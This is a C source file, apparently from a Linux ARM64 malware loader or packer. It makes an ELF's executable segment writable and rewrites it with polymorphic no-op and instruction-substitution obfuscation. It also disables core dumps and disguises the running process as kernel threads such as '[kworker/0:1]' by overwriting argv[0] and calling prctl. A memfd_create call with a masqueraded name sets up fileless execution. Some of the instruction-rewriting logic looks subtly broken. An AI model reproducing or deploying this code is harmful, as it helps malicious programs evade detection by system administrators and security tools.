#include "common.h"
#include "elf64.h"
#include <unistd.h>

// Define getpagesize if not available
#ifndef getpagesize
#define getpagesize() 4096  // Default page size for most systems
#endif


static const uint32_t arm64_nop_variants[] = {
    0xD503201F,  // nop          
    0xAA1F03E0,  // mov x0, xzr  
    0xAA0003E0,  // mov x0, x0  
    0xD2800000,  // mov x0, #0   
    0x52800000,  // mov w0, #0   
    0x91000000,  // add x0, x0, #0 
    0xD1000000,  // sub x0, x0, #0 
    0x8A1F0000,  // and x0, x0, xzr
};

void generate_polymorphic_nops_arm64(uint8_t* buffer, size_t nop_bytes, size_t max_size) {
    if (!buffer || nop_bytes > max_size || (nop_bytes % 4) != 0) return;

    uint32_t* inst_buffer = (uint32_t*)buffer;
    size_t nop_count = nop_bytes / 4;

    // Validate alignment
    if ((uintptr_t)inst_buffer % 4 != 0) return;

    size_t variants_count = sizeof(arm64_nop_variants) / sizeof(arm64_nop_variants[0]);
    for (size_t i = 0; i < nop_count; i++) {
        inst_buffer[i] = arm64_nop_variants[i % variants_count];
    }

}

void substitute_instructions_arm64(uint8_t* code, size_t max_len) {
if (!code || max_len < 4 || (max_len % 4) != 0) return;
    
    uint32_t* instructions = (uint32_t*)code;
    size_t inst_count = max_len / 4;
    
    // Validate alignment
    if ((uintptr_t)instructions % 4 != 0) return;
    
    for (size_t i = 0; i < inst_count; i++) {
        // Only substitute safe, equivalent instructions
        uint32_t inst = instructions[i];
        
        // mov x0, x1 -> orr x0, x1, xzr
        if ((inst & 0xFFE0FFE0) == 0xAA0003E0) {
            if (rand() % 100 < 30) {
                instructions[i] = (inst & ~0xFFE0FFE0) | 0xAA000020;
            }
        }
        
        // add x0, x0, #0 -> sub x0, x0, #0  
        else if ((inst & 0xFF000000) == 0x91000000) {
            if (rand() % 100 < 20) {
                instructions[i] = (inst & ~0xFF000000) | 0xD1000000;
            }
        }
    }
}

void apply_arm64_obfuscation(uint8_t* code, size_t len) {
        if (!code || len < 128) return;
    
    const Elf64_Ehdr* ehdr = (const Elf64_Ehdr*)code;
    if (!is_elf64_arm64(code)) return;
    
    // Find .text section
    const Elf64_Phdr* phdr = (const Elf64_Phdr*)(code + ehdr->e_phoff);
    size_t text_start = 0, text_size = 0;
    
    for (int i = 0; i < ehdr->e_phnum; i++) {
        if (phdr[i].p_type == PT_LOAD && (phdr[i].p_flags & PF_X)) {
            text_start = phdr[i].p_offset;
            text_size = phdr[i].p_filesz;
            break;
        }
    }
    
    if (text_start == 0 || text_size < 64) return;
    
    // Ensure 4-byte alignment
    text_start = (text_start + 3) & ~3;
    
    // Make memory writable
    size_t page_size = getpagesize();
    void* page_start = (void*)((uintptr_t)(code + text_start) & ~(page_size - 1));
    size_t page_len = ((text_size + page_size - 1) / page_size) * page_size;
    
    if (mprotect(page_start, page_len, PROT_READ | PROT_WRITE | PROT_EXEC) != 0) {
        return; // Cannot modify memory
    }
    
    size_t safe_size = text_size - 64;
    if (safe_size >= 32) {
        generate_polymorphic_nops_arm64(code + text_start + 32, 32, safe_size - 32);
        substitute_instructions_arm64(code + text_start + 32, safe_size - 32);
    }
    
    mprotect(page_start, page_len, PROT_READ | PROT_EXEC);
}

void secure_memory_wipe(void* ptr, size_t size) {
    if (!ptr || size == 0) return;

    volatile uint8_t* mem = (volatile uint8_t*)ptr;

    // Use secure random if available, fallback to rand
    static int rand_initialized = 0;
    if (!rand_initialized) {
        srand(time(NULL) ^ getpid());
        rand_initialized = 1;
    }

    for (int pass = 0; pass < 3; pass++) {
        for (size_t i = 0; i < size; i++) {
            switch (pass) {
                case 0: mem[i] = 0x00; break;      // Zeros
                case 1: mem[i] = 0xFF; break;      // Ones
                case 2: mem[i] = (uint8_t)rand(); break;  // Random
            }
        }
    }

    // Prevent optimization
    __asm__ __volatile__("" : : "r"(mem) : "memory");
}

void prevent_core_dumps(void) {
    struct rlimit rl;
    rl.rlim_cur = 0;
    rl.rlim_max = 0;
    // The below might fail, but the execution won't be impacted
    setrlimit(RLIMIT_CORE, &rl);
}

void hide_process_title(int argc, char* argv[]) {
    if (argc > 0 && argv && argv[0]) {

        size_t orig_len = strlen(argv[0]);
        memset(argv[0], 0, orig_len);

        const char* innocent_name = get_random_innocent_name();
        size_t copy_len = strlen(innocent_name);
        if (copy_len >= orig_len) {
            copy_len = orig_len - 1;
        }
        memcpy(argv[0], innocent_name, copy_len);
        argv[0][copy_len] = '\0';

        prctl(PR_SET_NAME, innocent_name, 0, 0, 0);
    }
}

static const char* innocent_process_names[] = {
    "[kworker/0:1]",      // Kernel worker thread
    "[ksoftirqd/0]",      // Kernel soft IRQ daemon
    "[migration/0]",      // CPU migration thread  
    "[rcu_gp]",           // RCU grace period
    "[watchdog/0]",       // Watchdog thread
    "[kcompactd0]",       // Memory compaction
    "[kswapd0]",          // Memory swap daemon
    "[systemd-journal]",  // System journal (if not too suspicious)
};

const char* get_random_innocent_name(void) {
    static int initialized = 0;
    if (!initialized) {
        srand(time(NULL));
        initialized = 1;
    }

    int index = rand() % (sizeof(innocent_process_names) / sizeof(innocent_process_names[0]));
    return innocent_process_names[index];
}

int create_masqueraded_memfd(void) {
    const char* innocent_name = get_random_innocent_name();
    return syscall2(__NR_memfd_create, (long)innocent_name, 0);
}